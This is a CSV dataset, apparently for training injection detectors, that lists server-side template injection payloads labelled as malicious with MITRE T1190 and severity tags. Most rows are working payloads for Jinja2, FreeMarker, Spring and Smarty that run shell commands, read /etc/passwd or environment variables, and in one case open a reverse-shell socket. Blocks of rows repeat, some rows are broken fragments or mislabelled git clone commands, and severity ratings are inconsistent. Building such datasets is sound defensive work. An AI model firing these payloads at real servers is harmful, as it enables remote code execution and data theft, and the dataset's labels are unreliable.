Payload,Signature,AttackType,Severity,MITRE,Label,Description
%7B%7B2%2A2%7D%7D%5B%5B3%2A3%5D%5D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B3%2A3%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B3%2A%273%27%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%3C%25%3D%203%20%2A%203%20%25%3E%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7B6%2A6%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7B%7B3%2A3%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%40%286%2B5%29%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%23%7B3%2A3%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%23%7B%203%20%2A%203%20%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bdump%28app%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bapp.request.server.all%7Cjoin%28%27%2C%27%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bconfig.items%28%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%20%5B%5D.class.base.subclasses%28%29%20%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27%27.class.mro%28%29%5B1%5D.subclasses%28%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%20%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%20%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27%27%2E%5F%5Fclass%5F%5F%2E%5F%5Fbase%5F%5F%2E%5F%5Fsubclasses%5F%5F%28%29%5B227%5D%28%27cat%20%2Fetc%2Fpasswd%27%2C%20shell%3DTrue%2C%20stdout%3D%2D1%29%2Ecommunicate%28%29%7D%7D,SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%25%20for%20key%2C%20value%20in%20config.iteritems%28%29%20%25%7D%3Cdt%3E%7B%7B%20key%7Ce%20%7D%7D%3C/dt%3E%3Cdd%3E%7B%7B%20value%7Ce%20%7D%7D%3C/dd%3E%7B%25%20endfor%20%25%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27a%27.toUpperCase%28%29%7D%7D%20%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%20request%20%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bself%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%3C%23assign%20ex%20%3D%20%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E%24%7B%20ex%28%22id%22%29%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%5B%23assign%20ex%20%3D%20%27freemarker.template.utility.Execute%27%3Fnew%28%29%5D%24%7B%20ex%28%27id%27%29%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bapp.request.query.filter%280%2C0%2C1024%2C%7B%27options%27%3A%27system%27%7D%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27ls%27%29.read%28%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28request.args.input%29.read%28%29%7D%7D%7B%25endif%25%7D%7B%25endfor%25%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%24smarty.version%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7Bphp%7Decho%20%60id%60%3B%7B/php%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%5B%27id%27%5D%7Cfilter%28%27system%27%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest%7Cattr%28%5Brequest.args.usc%2A2%2Crequest.args.class%2Crequest.args.usc%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest%7Cattr%28%5B%22_%22%2A2%2C%22class%22%2C%22_%22%2A2%5D%7Cjoin%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest%7Cattr%28%5B%22__%22%2C%22class%22%2C%22__%22%5D%7Cjoin%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest%7Cattr%28%22__class__%22%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest.__class__%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7Brequest%7Cattr%28%27application%27%29%7Cattr%28%27%5Cx5f%5Cx5fglobals%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fbuiltins%5Cx5f%5Cx5f%27%29%7Cattr%28%27%5Cx5f%5Cx5fgetitem%5Cx5f%5Cx5f%27%29%28%27%5Cx5f%5Cx5fimport%5Cx5f%5Cx5f%27%29%28%27os%27%29%7Cattr%28%27popen%27%29%28%27id%27%29%7Cattr%28%27read%27%29%28%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22new%20java.lang.String%28%27xxx%27%29%5C%22%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22whoami%5C%5C%5C%22%29%3B%20x.start%28%29%5C%22%29%7D%7D%0A,SSTI,SSTI,High,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22netstat%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%7B%27a%27.getClass%28%29.forName%28%27javax.script.ScriptEngineManager%27%29.newInstance%28%29.getEngineByName%28%27JavaScript%27%29.eval%28%5C%22var%20x%3Dnew%20java.lang.ProcessBuilder%3B%20x.command%28%5C%5C%5C%22uname%5C%5C%5C%22%2C%5C%5C%5C%22-a%5C%5C%5C%22%29%3B%20org.apache.commons.io.IOUtils.toString%28x.start%28%29.getInputStream%28%29%29%5C%22%29%7D%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%22python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ip%5C%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22/bin/cat%5C%22%2C%20%5C%22flag.txt%5C%22%5D%29%3B%27%22%29.read%28%29.zfill%28417%29%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7BT%28java.lang.System%29.getenv%28%29%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27cat%20etc/passwd%27%29%7D%0A,SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%2899%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%28116%29%29.concat%28T%28java.lang.Character%29.toString%2899%29%29.concat%28T%28java.lang.Character%29.toString%2847%29%29.concat%28T%28java.lang.Character%29.toString%28112%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28115%29%29.concat%28T%28java.lang.Character%29.toString%28119%29%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7D%0A,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{2*2}}[[3*3]],SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{3*3}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{3*'3'}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
<%= 3 * 3 %>,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${6*6},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${{3*3}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
@(6+5),SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{3*3},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{ 3 * 3 },SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
*{7*7},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{dump(app)}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{app.request.server.all|join(',')}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.items()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ [].class.base.subclasses() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{''.class.mro()[1].subclasses()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{'a'.toUpperCase()}} ,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ request }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{self}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${""freemarker.template.utility.Execute""?new()(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{$smarty.version},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{php}echo `id`;{/php},SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
{{['id']|filter('system')}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{request|attr(""__class__"")}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request.__class__}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.System).getenv()},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
{{2*2}}[[3*3]],SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{3*3}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{3*'3'}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
<%= 3 * 3 %>,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${6*6},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${{3*3}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
@(6+5),SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{3*3},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{ 3 * 3 },SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{dump(app)}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{app.request.server.all|join(',')}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.items()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ [].class.base.subclasses() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{''.class.mro()[1].subclasses()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{''.__class__.__base__.__subclasses__()}} # Search for Popen process, use payload below change 227 to index of Popen",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{'a'.toUpperCase()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ request }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{self}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${""freemarker.template.utility.Execute""?new()(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{$smarty.version},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{php}echo `id`;{/php},SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
{{['id']|filter('system')}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{request|attr(""__class__"")}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request.__class__}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.System).getenv()},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
root@ismailtasdelen:~# git clone https://github.com/payloadbox/ssti-payloads.git,SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
root@ismailtasdelen:~# git clone git@github.com:payloadbox/ssti-payloads.git,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{php}echo """,SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{2*2}}[[3*3]],SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{3*3}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{3*'3'}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
<%= 3 * 3 %>,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${6*6},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${{3*3}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
@(6+5),SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{3*3},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
#{ 3 * 3 },SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{dump(app)}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{app.request.server.all|join('","')}}""",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.items()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ [].class.base.subclasses() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{''.class.mro()[1].subclasses()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{''.__class__.__base__.__subclasses__()}} # Search for Popen process, use payload below change 227 to index of Popen",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{'a'.toUpperCase()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{ request }},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{self}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"${""freemarker.template.utility.Execute""?new()(""id"")}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{$smarty.version},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{php}echo `id`;{/php},SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
{{['id']|filter('system')}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{request|attr(""__class__"")}}",SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request.__class__}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.System).getenv()},SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
root@ismailtasdelen:~# git clone https://github.com/payloadbox/ssti-payloads.git,SSTI,SSTI,Medium,T1190,Malicious,SSTI payload from comprehensive dataset
root@ismailtasdelen:~# git clone git@github.com:payloadbox/ssti-payloads.git,SSTI,SSTI,Low,T1190,Malicious,SSTI payload from comprehensive dataset
"{php}echo """,SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
",SSTI,SSTI,Critical,T1190,Malicious,SSTI payload from comprehensive dataset
